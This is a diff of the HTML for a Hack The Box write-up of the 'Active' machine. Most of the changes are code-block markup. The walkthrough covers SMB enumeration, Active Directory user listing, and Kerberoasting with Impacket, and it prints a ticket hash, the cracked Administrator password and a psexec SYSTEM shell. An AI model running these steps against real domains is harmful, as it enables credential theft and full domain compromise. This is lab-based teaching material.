 <h1 id="being-svc_tgs">Being SVC_TGS</h1>
 <h2 id="checking-smb-again">Checking SMB again</h2>
 <p>We have brand new credentials which may give us more access then before. Check
 out the SMB shares again to see what &ldquo;SVC_TGS&rdquo; can do:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ python smbmap.py -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
-[+] Finding open SMB ports....
-[+] User SMB session establishd on 10.10.10.100...
-[+] IP: 10.10.10.100:445        Name: 10.10.10.100
-        Disk                                                    Permissions
-        ----                                                    -----------
-        ADMIN$                                                  NO ACCESS
-        C$                                                      NO ACCESS
-        IPC$                                                    NO ACCESS
-        NETLOGON                                                READ ONLY
-        Replication                                             READ ONLY
-        SYSVOL                                                  READ ONLY
-        Users                                                   READ ONLY
-</code></pre></div><p>Interestingly, we now have read access to the &ldquo;Users&rdquo; volumne, which is where
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ python smbmap.py -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+</span></span><span style="display:flex;"><span>[+] Finding open SMB ports....
+</span></span><span style="display:flex;"><span>[+] User SMB session establishd on 10.10.10.100...
+</span></span><span style="display:flex;"><span>[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions
+</span></span><span style="display:flex;"><span>        ----                                                    -----------
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS
+</span></span><span style="display:flex;"><span>        IPC$                                                    NO ACCESS
+</span></span><span style="display:flex;"><span>        NETLOGON                                                READ ONLY
+</span></span><span style="display:flex;"><span>        Replication                                             READ ONLY
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  READ ONLY
+</span></span><span style="display:flex;"><span>        Users                                                   READ ONLY
+</span></span></code></pre></div><p>Interestingly, we now have read access to the &ldquo;Users&rdquo; volumne, which is where
 the flags should be. Connecting to the share, we can retrieve the &ldquo;user.txt&rdquo;
 flag, but &ldquo;root.txt&rdquo; is obviously not accessible as we are not an administrator.</p>
 <h2 id="enumerating-active-directory">Enumerating Active Directory</h2>
@@ -573,29 +573,29 @@ flag, but &ldquo;root.txt&rdquo; is obviously not accessible as we are not an ad
 interesting information, you can use <a href="https://github.com/ropnop/windapsearch">windapsearch</a>,
 a Python script that pulls data about users, groups, computers, and more.
 For instance, listing all domain users is accomplished like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ python windapsearch.py --dc-ip 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -U
-[+] Using Domain Controller at: 10.10.10.100
-[+] Getting defaultNamingContext from Root DSE
-[+]     Found: DC=active,DC=htb
-[+] Attempting bind
-[+]     ...success! Binded as:
-[+]      u:ACTIVE\SVC_TGS
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>[+] Enumerating all AD users
-[+]     Found 4 users:
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>cn: Administrator
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>cn: Guest
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>cn: krbtgt
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>cn: SVC_TGS
-userPrincipalName: SVC_TGS@active.htb
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>[*] Bye!
-</code></pre></div><p>There is not much apart from the default Administrator and Guest. We know
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ python windapsearch.py --dc-ip 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -U
+</span></span><span style="display:flex;"><span>[+] Using Domain Controller at: 10.10.10.100
+</span></span><span style="display:flex;"><span>[+] Getting defaultNamingContext from Root DSE
+</span></span><span style="display:flex;"><span>[+]     Found: DC=active,DC=htb
+</span></span><span style="display:flex;"><span>[+] Attempting bind
+</span></span><span style="display:flex;"><span>[+]     ...success! Binded as:
+</span></span><span style="display:flex;"><span>[+]      u:ACTIVE\SVC_TGS
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Enumerating all AD users
+</span></span><span style="display:flex;"><span>[+]     Found 4 users:
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>cn: Administrator
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>cn: Guest
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>cn: krbtgt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>cn: SVC_TGS
+</span></span><span style="display:flex;"><span>userPrincipalName: SVC_TGS@active.htb
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Bye!
+</span></span></code></pre></div><p>There is not much apart from the default Administrator and Guest. We know
 SVC_TGS already, and found an additional &ldquo;krbtgt&rdquo; user. This one is a default
 account too. It comes with an Active Directory installation, according to
 <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#krbtgt-account">Microsoft
@@ -655,29 +655,29 @@ reading Kerberos tickets from memory with mimikatz, as described <a href="http:/
 With today&rsquo;s amazing tooling though, it is drop-dead simple to do. Given domain user
 credentials, <a href="https://github.com/CoreSecurity/impacket">Impacket</a> is all you
 need:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ python /opt/impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
-Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon
---------------------  -------------  --------------------------------------------------------  -------------------  -------------------
-active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40  2018-07-30 13:17:40
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$09a16612e21d8979ea1a2025ae9bc848$40579360035c960293a35a2509a6d6cfa5e1e6ad1b7ec03ca22e6875d33abbe4eb6e099d7a1a03b6820514f96806b1f9938590bbcc8c25889f26800b3b4baf4a905aabf2aa32efaca6b20c8e2252f79f7f98a35ce4684e468ef5f0b48286bc18cdc590999cc20ca4620dddd8567f7e6d2b9c3984643d43a129afffea2cd99f92b74003cf41f3540b312d6203b84a1edae1888010fdb21868058683f3699e191539a303a46a4a03ba8bb9e1928a9683d4250b8838f7ad4491ef8ad2ff9c81a47b42362b0e6b9cd5351bd532406c951db6063083c052b0b685627e190c898cecc4262286124abb68f757e6265f27e826f9097c3a1d67b546829d738153e986f2f60c18e56e48ecd8abcd97f11e0d2ea05e28544b8779e2b9c34f6fd604cedd43a44b69dc4fdd7018c18d7d58c82b2974e91aba29a3cb279d3da43e9fb8717a86476cdae2a120f4e417afea631503191ca1b80e8343350c35943940057b02b28c4289f83206617d41c0bc1e7b05f2216e7cb0ede9b0d4243f35af58da01d5f0a5391fe4eb51c22dad7cce6f3b5e6976081541c1a100be9326f8e725969344e0859bc3a7683bd53874de6423402d9c20a1f9a62ad8cf399dc31d5eb67fa684f2ffcc9dc64c9d24cc1cb8ae33a56162f79ba96db62bfa0e64c1d6f5dcf34093864805a751b883a616a77f1460e9df5a6a38850649dad3679124b173d2fe5d71fcf3324f1d077565dc83f62328510fdee30849dcbe37f8c267bdc36e720ba2d41282778a4fc2292f2d9cdfe54d7eb5cde85ab4cfb82d7c4700d500503d83529788787794392b8720c67b23460c5473fe604a83a837c16e95c338352c32a1d79deddd079ab5dd81f6f86f9cbab517890ee3cd0dfd648e71b56ce314f7de4f07ebe2345eb361362995a03be531841723f83fb12793a5548890d9445bde2fd17d7ac7ba45913254385f4c9cd45c70968b5ee6f6be9931ec4eb0767d5514b86bf287cc84ce044f3abbcff0efc9d5d0dc62f38f3a7cce73a706157e5181c60be9017b3bd5bcc50a154fdd602ea6bc753c8a4c7199f58a13be861b107a1ce9190e3b0d1f706dd26921599b80f6b9027cbc3dde9b6e758fb174ecdc7ddd696159e22755c566152b0cec57c07e1b466a720e76ac23b1a3ffa8c2867a1f85b1a055641bce8357a07e964ed4d54ef1f561dc15b3792c994fad51887f5de85dc0707698fa2c8e7cae121a7d3f1842ef2cae417b2d0a3cf5e105360df89fdef97c8349
-</code></pre></div><p>We are lucky and find that &ldquo;Administrator&rdquo; has an SPN set for CIFS. Impacket
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ python /opt/impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+</span></span><span style="display:flex;"><span>Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon
+</span></span><span style="display:flex;"><span>--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
+</span></span><span style="display:flex;"><span>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40  2018-07-30 13:17:40
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$09a16612e21d8979ea1a2025ae9bc848$40579360035c960293a35a2509a6d6cfa5e1e6ad1b7ec03ca22e6875d33abbe4eb6e099d7a1a03b6820514f96806b1f9938590bbcc8c25889f26800b3b4baf4a905aabf2aa32efaca6b20c8e2252f79f7f98a35ce4684e468ef5f0b48286bc18cdc590999cc20ca4620dddd8567f7e6d2b9c3984643d43a129afffea2cd99f92b74003cf41f3540b312d6203b84a1edae1888010fdb21868058683f3699e191539a303a46a4a03ba8bb9e1928a9683d4250b8838f7ad4491ef8ad2ff9c81a47b42362b0e6b9cd5351bd532406c951db6063083c052b0b685627e190c898cecc4262286124abb68f757e6265f27e826f9097c3a1d67b546829d738153e986f2f60c18e56e48ecd8abcd97f11e0d2ea05e28544b8779e2b9c34f6fd604cedd43a44b69dc4fdd7018c18d7d58c82b2974e91aba29a3cb279d3da43e9fb8717a86476cdae2a120f4e417afea631503191ca1b80e8343350c35943940057b02b28c4289f83206617d41c0bc1e7b05f2216e7cb0ede9b0d4243f35af58da01d5f0a5391fe4eb51c22dad7cce6f3b5e6976081541c1a100be9326f8e725969344e0859bc3a7683bd53874de6423402d9c20a1f9a62ad8cf399dc31d5eb67fa684f2ffcc9dc64c9d24cc1cb8ae33a56162f79ba96db62bfa0e64c1d6f5dcf34093864805a751b883a616a77f1460e9df5a6a38850649dad3679124b173d2fe5d71fcf3324f1d077565dc83f62328510fdee30849dcbe37f8c267bdc36e720ba2d41282778a4fc2292f2d9cdfe54d7eb5cde85ab4cfb82d7c4700d500503d83529788787794392b8720c67b23460c5473fe604a83a837c16e95c338352c32a1d79deddd079ab5dd81f6f86f9cbab517890ee3cd0dfd648e71b56ce314f7de4f07ebe2345eb361362995a03be531841723f83fb12793a5548890d9445bde2fd17d7ac7ba45913254385f4c9cd45c70968b5ee6f6be9931ec4eb0767d5514b86bf287cc84ce044f3abbcff0efc9d5d0dc62f38f3a7cce73a706157e5181c60be9017b3bd5bcc50a154fdd602ea6bc753c8a4c7199f58a13be861b107a1ce9190e3b0d1f706dd26921599b80f6b9027cbc3dde9b6e758fb174ecdc7ddd696159e22755c566152b0cec57c07e1b466a720e76ac23b1a3ffa8c2867a1f85b1a055641bce8357a07e964ed4d54ef1f561dc15b3792c994fad51887f5de85dc0707698fa2c8e7cae121a7d3f1842ef2cae417b2d0a3cf5e105360df89fdef97c8349
+</span></span></code></pre></div><p>We are lucky and find that &ldquo;Administrator&rdquo; has an SPN set for CIFS. Impacket
 already requested a ticket and printed out a <code>john</code>-compatible hash that waits
 to be cracked. Put it into a file &ldquo;krb.txt&rdquo; and go for it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ john ./krb.txt --wordlist=/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
-Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
-Will run 4 OpenMP threads
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
-Ticketmaster1968 (?)
-1g 0:00:00:08 DONE (2018-09-16 11:43) 0.1212g/s 1277Kp/s 1277Kc/s 1277KC/s Tiffani1432..Thrash1
-Use the &#34;--show&#34; option to display all of the cracked passwords reliably
-Session completed
-</code></pre></div><p>Cracking took only a few seconds and gave us &ldquo;Administrator&rdquo; and
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ john ./krb.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+</span></span><span style="display:flex;"><span>Will run 4 OpenMP threads
+</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span>Ticketmaster1968 (?)
+</span></span><span style="display:flex;"><span>1g 0:00:00:08 DONE (2018-09-16 11:43) 0.1212g/s 1277Kp/s 1277Kc/s 1277KC/s Tiffani1432..Thrash1
+</span></span><span style="display:flex;"><span>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed
+</span></span></code></pre></div><p>Cracking took only a few seconds and gave us &ldquo;Administrator&rdquo; and
 &ldquo;Ticketmaster1968&rdquo; as a new pair of credentials.</p>
 <p>Side note: there is a nice three part blog post series about Kerberoasting in
 which many more methods are described:
@@ -688,22 +688,22 @@ you may be able to perform this attack without credentials, given only a shell
 on the system.</p>
 <h1 id="administrator-with-psexec">Administrator with psexec</h1>
 <p>With admin credentials, it is easy to get a shell and the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ python psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd
-Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>[*] Requesting shares on 10.10.10.100.....
-[*] Found writable share ADMIN$
-[*] Uploading file lRSucApr.exe
-[*] Opening SVCManager on 10.10.10.100.....
-[*] Creating service eMOD on 10.10.10.100.....
-[*] Starting service eMOD.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>C:\Windows\system32&gt;whoami
-nt authority\system
-</code></pre></div><h1 id="references">References</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ python psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd
+</span></span><span style="display:flex;"><span>Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Requesting shares on 10.10.10.100.....
+</span></span><span style="display:flex;"><span>[*] Found writable share ADMIN$
+</span></span><span style="display:flex;"><span>[*] Uploading file lRSucApr.exe
+</span></span><span style="display:flex;"><span>[*] Opening SVCManager on 10.10.10.100.....
+</span></span><span style="display:flex;"><span>[*] Creating service eMOD on 10.10.10.100.....
+</span></span><span style="display:flex;"><span>[*] Starting service eMOD.....
+</span></span><span style="display:flex;"><span>[!] Press help for extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 6.1.7601]
+</span></span><span style="display:flex;"><span>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>C:\Windows\system32&gt;whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><h1 id="references">References</h1>
 <p>Some good blog posts about GPP include</p>
 <ul>
 <li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
@@ -761,7 +761,7 @@ nt authority\system
         <time datetime="12M">12 minutes</time>
       
         <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
-        <time datetime="10M">10 minutes</time>
+        <time datetime="9M">9 minutes</time>
       
         <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
         <time datetime="8M">8 minutes</time>
